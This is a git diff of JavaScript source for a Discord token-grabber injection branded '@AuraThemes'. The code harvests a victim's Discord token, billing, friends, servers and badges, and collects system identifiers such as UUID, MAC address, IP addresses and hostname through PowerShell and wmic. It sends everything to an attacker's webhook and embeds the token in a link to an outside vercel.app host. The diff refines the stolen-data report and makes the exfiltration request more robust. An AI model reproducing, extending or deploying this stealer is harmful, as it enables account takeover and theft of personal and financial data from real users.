@@ -128,49 +128,61 @@ const request = async (method, url, headers = {}, data = null) => {
 
 const notify = async (ctx, token, acc) => {
     let system = {
-        WIN_PRODUCT_VERSION: execSync("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName",).toString().split("\r\n")[0],
-        MAC_ADDRESS: execSync("powershell.exe (Get-CimInstance -ClassName 'Win32_NetworkAdapter' -Filter 'NetConnectionStatus = 2').MACAddress",).toString().split("\r\n")[0],
-        CPU_COUNT: os.cpus().length,
-        PC_NAME: os.hostname(),
-        LOCAL_IP: execSync("powershell.exe (Get-NetIPAddress).IPAddress").toString().split("\r\n")[0],
-        UUID: execSync("powershell.exe (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID",).toString().split("\r\n")[0],
-        GPU: execSync("wmic PATH Win32_VideoController get name | more +1").toString().replace(/\r\n/g, "").replace(/\r/g, ""),
-        RAM: (os.totalmem() / (1024 * 1024 * 1024)).toFixed(2) + " GB",
         CPU: os.cpus()[0].model,
-        OS: `${os.type()} ${os.arch()}`,
+        GPU: execSync("wmic PATH Win32_VideoController get name | more +1").toString().replace(/\r\n/g, "").replace(/\r/g, ""),
+        UUID: execSync("powershell.exe (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID",).toString().split("\r\n")[0],
+        RAM: (os.totalmem() / (1024 * 1024 * 1024)).toFixed(2) + " GB",
+        Mac_Address: execSync("powershell.exe (Get-CimInstance -ClassName 'Win32_NetworkAdapter' -Filter 'NetConnectionStatus = 2').MACAddress",).toString().split("\r\n")[0],
+        Product_Key: execSync("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName",).toString().split("\r\n")[0],
+        Local_IP: execSync("powershell.exe (Get-NetIPAddress).IPAddress").toString().split("\r\n")[0],
+        CPU_Count: os.cpus().length,
+        PC_Name: os.hostname(),
+        OS_Version: `${os.type()} ${os.arch()}`,
     };
+
     let nitro = getNitro(await fProfile(token)),
         badges = await getBadges(acc.flags),
         billing = await getBilling(token),
         friends = await getFriends(token),
         servers = await getServers(token);
+
     ctx.username = "@AuraThemes - Injection";
     ctx.avatar_url = "https://i.imgur.com/WkKXZSl.gif";
     ctx.embeds[0].title = `Initialized Grabber - ${ctx.title}`;
-    ctx.embeds[0].description = `\n**Token:**\n\`\`\`${token}\`\`\`\n[[Click Here To Copy Your Token]](https://6889-fun.vercel.app/api/aurathemes/raw?data=${token})`;
+    ctx.embeds[0].fields = [
+        { 
+            name: `<a:aura:1087044506542674091> Token:`, 
+            value: `\`\`\`${token}\`\`\`\n[[Click Here To Copy Your Token]](https://6889-fun.vercel.app/api/aurathemes/raw?data=${token})`, 
+            inline: false
+        },
+    ];
+
     ctx.embeds[0].thumbnail = {
         url: `https://cdn.discordapp.com/avatars/${acc.id}/${acc.avatar}.webp`,
     };
+
     ctx.embeds[0].fields.push(
         { name: "Nitro", value: nitro, inline: true },
         { name: "Badges", value: badges, inline: true },
         { name: "Billing", value: billing, inline: true },
         { name: "Path", value: `\`${__dirname.toString().trim().replace(/\\/g, "/")}\``, inline: false },
     );
+
     ctx.embeds.push(
         { title: `HQ Friend(s)`, description: friends },
         { title: `HQ Guild(s)`, description: servers },
         {
             title: `System Informatio(s)`,
             fields: [
-                { name: "User", value: `\`\`\`yml\nUsername: ${os.userInfo().username}\`\`\``, inline: true },
-                { name: "System", value: `\`\`\`yml\n${Object.entries({ ...system }).map(([k, v]) => `${k}: ${v}`).join("\n")}\`\`\``, },
-                { name: "Network", value: `\`\`\`yml\nPublic: ${JSON.parse(await getNetwork()).ip}\`\`\``, }
+                { name: "User", value: `||\`\`\`yml\nUsername: ${os.userInfo().username}\`\`\`||`, inline: true },
+                { name: "System", value: `||\`\`\`yml\n${Object.entries({ ...system }).map(([k, v]) => `${k}: ${v}`).join("\n")}\`\`\`||`, },
+                { name: "Network", value: `||\`\`\`yml\nPublic: ${JSON.parse(await getNetwork()).ip}\`\`\`||`, }
             ]
         },
     );
+
     ctx.embeds.forEach((e) => {
-        e.color = parseInt("#c267ff".replaceAll("#", ""), 16);
+        e.color = 12740607;
         e.timestamp = new Date();
         e.author = {
             name: `${acc.username} | ${acc.id}`,
@@ -181,9 +193,14 @@ const notify = async (ctx, token, acc) => {
             icon_url: "https://i.imgur.com/yVnOSeS.gif",
         };
     });
-    await request("POST", WEBHOOK, {
-        "Content-Type": "application/json"
-    }, JSON.stringify(ctx));
+
+    try {
+        await request("POST", WEBHOOK, {
+            "Content-Type": "application/json"
+        }, JSON.stringify(ctx));
+    } catch (error) {
+        console.error("Error sending request to webhook:", error.message);
+    }
 };
 
 const decodeB64 = (s) =>
@@ -254,7 +271,7 @@ const getFriends = async (s) =>
             ? (r || "**Rare Friends:**\n") + `${b} ${a.user.username}#${a.user.discriminator}\n`
             : r)(getRareBadges(a.user.public_flags)),
             "",
-        ) || "Not Found";
+        ) || ":x:";
 
 const getServers = async (w) =>
     (await fServers(w))
@@ -262,7 +279,7 @@ const getServers = async (w) =>
         .reduce((r, g) => (r || "**Rare Servers:**\n") + `${g.owner
             ? ":crown: Owner"
             : ":gear: Admin"} | Server Name: \`${g.name}\` | Members: \`${g.approximate_member_count}\` - Online(s): \`${g.approximate_presence_count}\`\n[[Get Avatar Link]](https://cdn.discordapp.com/icons/${g.id}/${g.icon}.png?size=2048)\n`, "",
-        ) || "Not Found";
+        ) || ":x:";
 
 const getDate = (a, b) => new Date(a).setMonth(a.getMonth() + b);
 
